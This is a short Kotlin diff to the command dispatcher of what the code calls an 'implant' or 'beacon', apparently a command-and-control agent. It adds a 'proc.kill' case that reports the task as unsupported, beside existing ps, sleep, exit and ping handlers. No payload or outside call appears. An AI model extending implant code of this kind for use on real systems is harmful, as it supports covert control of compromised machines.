@@ -219,6 +219,7 @@ object TaskRunner {
                 args.field("eof")?.flag() ?: true,
             )
             "ps" -> processList()
+            "proc.kill" -> unsupported("proc.kill", "the implant does not kill processes by itself")
             "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
             "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
             "ping" -> Outcome(0, "pong\n".toByteArray(), "")
